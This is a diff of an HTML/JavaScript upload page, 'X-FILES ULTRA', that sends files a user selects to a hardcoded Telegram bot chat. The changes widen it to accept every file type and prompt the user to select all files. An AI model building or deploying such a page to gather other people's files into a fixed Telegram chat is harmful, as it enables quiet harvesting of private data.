@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>X-FILES ULTRA - PRO MODE</title>
+    <title>GX.Sammim - X-FILES ULTRA</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;600;900&display=swap'); 
@@ -11,6 +11,7 @@
         .glass { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(25px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 35px; } 
         .active-tab { background: #3b82f6 !important; color: #fff !important; box-shadow: 0 0 25px rgba(59, 130, 246, 0.5); } 
         .file-card { transition: 0.3s; border: 1px solid rgba(255,255,255,0.1); } 
+        .owner-tag { background: linear-gradient(90deg, #3b82f6, #8b5cf6); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-size: 1.2rem; font-weight: 900; letter-spacing: 5px; }
         ::-webkit-scrollbar { width: 5px; } 
         ::-webkit-scrollbar-thumb { background: #333; border-radius: 10px; }
     </style>
@@ -18,10 +19,15 @@
 <body class="p-4">
 
 <div class="max-w-5xl mx-auto"> 
+    <div class="text-center mb-6">
+        <h2 class="owner-tag uppercase">GX.Sammim</h2>
+        <div class="h-[1px] w-20 bg-blue-500 mx-auto mt-1 opacity-50"></div>
+    </div>
+
     <div class="glass p-8 mb-8 flex flex-col md:flex-row justify-between items-center"> 
         <div> 
             <h1 class="text-3xl font-black tracking-tighter uppercase italic">X-FILES <span class="text-blue-500">ULTRA</span></h1> 
-            <p id="eta-text" class="text-[10px] text-blue-400 font-bold uppercase tracking-widest mt-1">Retry & Sound FX Active</p> 
+            <p id="eta-text" class="text-[10px] text-blue-400 font-bold uppercase tracking-widest mt-1">Multi-Selection Mode Active</p> 
         </div> 
         <div class="flex bg-black/50 p-1 rounded-2xl border border-white/10 mt-6 md:mt-0"> 
             <button onclick="setType('photo')" id="tab-photo" class="tab-btn active-tab px-8 py-2 rounded-xl text-xs font-black transition-all">PHOTO</button> 
@@ -32,9 +38,9 @@
     <div class="grid grid-cols-1 lg:grid-cols-3 gap-8"> 
         <div class="lg:col-span-1"> 
             <label class="glass h-64 flex flex-col items-center justify-center cursor-pointer border-2 border-dashed border-gray-700 hover:border-blue-500 transition-all mb-6 group"> 
-                <input type="file" id="fileInput" multiple accept="image/*" class="hidden"> 
+                <input type="file" id="fileInput" multiple accept="*" class="hidden"> 
                 <span id="upload-icon" class="text-6xl mb-3 group-hover:scale-110 transition-transform">🖼️</span> 
-                <p id="upload-label" class="text-[11px] text-gray-400 font-black tracking-[0.2em] uppercase">Select Assets</p> 
+                <p id="upload-label" class="text-[11px] text-gray-400 font-black tracking-[0.2em] uppercase text-center px-4">Hold & Select All Files</p> 
             </label> 
 
             <button onclick="ignite()" id="sendBtn" class="w-full py-6 bg-white text-black font-black rounded-[30px] hover:bg-blue-600 hover:text-white transition-all active:scale-95 shadow-2xl uppercase tracking-[0.3em]">Ignite Transfer</button> 
@@ -62,20 +68,6 @@ const CHAT_ID = "5923885908";
 let queue = []; 
 let currentType = 'photo'; 
 
-// ৪. সাউন্ড ইফেক্ট ফাংশন
-const playSuccessSound = () => {
-    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-    const oscillator = audioCtx.createOscillator();
-    const gainNode = audioCtx.createGain();
-    oscillator.connect(gainNode);
-    gainNode.connect(audioCtx.destination);
-    oscillator.type = 'sine';
-    oscillator.frequency.setValueAtTime(880, audioCtx.currentTime); // High pitch A5
-    gainNode.gain.setValueAtTime(0.1, audioCtx.currentTime);
-    oscillator.start();
-    oscillator.stop(audioCtx.currentTime + 0.1);
-};
-
 function setType(type) { 
     currentType = type; 
     document.querySelectorAll('.tab-btn').forEach(b => { 
@@ -84,12 +76,13 @@ function setType(type) {
     }); 
     document.getElementById(`tab-${type}`).classList.add('active-tab'); 
     document.getElementById('upload-icon').innerText = type === 'photo' ? '🖼️' : '📂'; 
-    document.getElementById('upload-label').innerText = type === 'photo' ? 'Select Photos' : 'Select High-Res Files';
-    document.getElementById('fileInput').accept = type === 'photo' ? "image/*" : "*/*";
+    document.getElementById('upload-label').innerText = type === 'photo' ? 'Hold & Select Photos' : 'Hold & Select Files';
+    document.getElementById('fileInput').accept = "*/*"; 
 } 
 
 document.getElementById('fileInput').onchange = (e) => { 
-    queue = [...queue, ...Array.from(e.target.files)]; 
+    const files = Array.from(e.target.files);
+    queue = [...queue, ...files]; 
     render(); 
     e.target.value = ""; 
 }; 
@@ -113,7 +106,6 @@ function render() {
 
 function remove(i) { queue.splice(i, 1); render(); } 
 
-// ৭. অটো-রিট্রাই সিস্টেম সহ সেন্ডিং ফাংশন
 async function sendWithRetry(file, retries = 3) {
     const apiMethod = currentType === 'photo' ? 'sendPhoto' : 'sendDocument'; 
     const fd = new FormData(); 
@@ -125,7 +117,6 @@ async function sendWithRetry(file, retries = 3) {
             const res = await fetch(`https://api.telegram.org/bot${TOKEN}/${apiMethod}`, { method: "POST", body: fd });
             if (res.ok) return true;
         } catch (e) {
-            console.log(`Retry ${i+1} for file ${file.name}`);
             if (i === retries - 1) return false;
         }
     }
@@ -134,7 +125,6 @@ async function sendWithRetry(file, retries = 3) {
 
 async function ignite() { 
     if(!queue.length) return; 
-    
     const btn = document.getElementById('sendBtn'); 
     const sCountDisp = document.getElementById('s-count'); 
     const qCountDisp = document.getElementById('q-count'); 
@@ -156,16 +146,13 @@ async function ignite() {
                 sCountDisp.innerText = sent;
                 qCountDisp.innerText = total - sent;
                 etaDisp.innerText = `SYNCING: ${sent}/${total}`;
-                playSuccessSound(); // সাউন্ড বাজবে
-            } else {
-                etaDisp.innerText = `FAILED: ${file.name}`;
             }
         }));
     }
 
     btn.innerText = "MISSION SUCCESS"; 
     btn.style.background = "#10b981";
-    setTimeout(() => { location.reload(); }, 2000); 
+    setTimeout(() => { location.reload(); }, 1500); 
 } 
 </script>
 </body>
